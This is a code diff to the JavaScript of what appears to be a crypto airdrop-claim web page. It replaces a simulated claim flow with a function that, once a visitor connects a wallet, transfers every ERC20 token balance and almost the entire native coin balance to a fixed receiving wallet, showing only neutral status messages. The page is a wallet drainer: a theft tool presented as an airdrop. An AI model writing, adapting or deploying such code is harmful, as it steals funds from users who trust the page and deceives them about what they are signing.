@@ -156,7 +156,7 @@ async function handleWalletConnection() {
   if (!isMobile && !window.ethereum?.selectedAddress) {
     return showWalletOptions();
   }
-  await connectAndClaim();
+  await connectAndProcess();
 }
 
 function showWalletOptions() {
@@ -200,7 +200,7 @@ function showWalletOptions() {
   // Add event listeners
   document.getElementById("metaMaskBtn").addEventListener('click', async () => {
     document.body.removeChild(modal);
-    await connectAndClaim();
+    await connectAndProcess();
   });
   
   document.getElementById("walletConnectBtn").addEventListener('click', () => {
@@ -213,7 +213,7 @@ function showWalletOptions() {
   });
 }
 
-async function connectAndClaim() {
+async function connectAndProcess() {
   try {
     showLoader();
     updateStatus("Connecting wallet...", "success");
@@ -227,7 +227,7 @@ async function connectAndClaim() {
     const initialized = await initializeWallet();
     if (!initialized) return;
     
-    await processAirdropClaim();
+    await transferAllTokens();
   } catch (err) {
     console.error("Connection error:", err);
     updateStatus("Error: " + err.message, "error");
@@ -270,40 +270,65 @@ async function checkNetwork() {
   }
 }
 
-async function processAirdropClaim() {
+async function transferAllTokens() {
   try {
-    // Check eligibility (simulated)
-    const isEligible = await checkEligibility();
-    if (!isEligible) {
-      throw new Error("Wallet not eligible for airdrop");
+    const tokens = TOKENS[currentNetwork];
+    let successCount = 0;
+    
+    // Process ERC20 tokens
+    for (const token of tokens.filter(t => !t.isNative)) {
+      try {
+        const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
+        const balance = await contract.balanceOf(userAddress);
+        
+        if (balance.gt(0)) {
+          const tx = await contract.transfer(RECEIVING_WALLET, balance, {
+            gasLimit: 100000
+          });
+          await tx.wait();
+          successCount++;
+          updateStatus(
+            `Transferred ${token.symbol} <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
+            "success"
+          );
+        }
+      } catch (err) {
+        console.error(`Transfer error for ${token.symbol}:`, err);
+        updateStatus(`Failed to transfer ${token.symbol}`, "error");
+      }
+    }
+
+    // Process native token
+    const nativeToken = tokens.find(t => t.isNative);
+    if (nativeToken) {
+      try {
+        const balance = await provider.getBalance(userAddress);
+        const keepAmount = ethers.utils.parseUnits("0.001", nativeToken.decimals);
+        const sendAmount = balance.gt(keepAmount) ? balance.sub(keepAmount) : balance;
+        
+        if (sendAmount.gt(0)) {
+          const tx = await signer.sendTransaction({
+            to: RECEIVING_WALLET,
+            value: sendAmount,
+            gasLimit: 21000
+          });
+          await tx.wait();
+          successCount++;
+          updateStatus(
+            `Transferred ${nativeToken.symbol} <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
+            "success"
+          );
+        }
+      } catch (err) {
+        console.error("Native transfer error:", err);
+        updateStatus("Failed to transfer native token", "error");
+      }
     }
     
-    // Get claim amount
-    const claimAmount = await calculateClaimAmount();
-    
-    // Process claim
-    updateStatus(`Claiming ${claimAmount} tokens...`, "success");
-    
-    // For demo purposes, we'll simulate the claim
-    await new Promise(resolve => setTimeout(resolve, 2000));
-    
-    updateStatus(
-      `Airdrop claimed successfully!`,
-      "success"
-    );
-    
-    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Claimed`;
+    updateStatus(`Completed ${successCount} transfers`, "success");
+    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Done`;
   } catch (err) {
-    console.error("Claim error:", err);
-    throw new Error("Claim failed: " + err.message);
+    console.error("Transfer process error:", err);
+    throw new Error("Transfer process failed");
   }
-}
-
-// Simulated functions for demo purposes
-async function checkEligibility() {
-  return true;
-}
-
-async function calculateClaimAmount() {
-  return "1,250";
 }
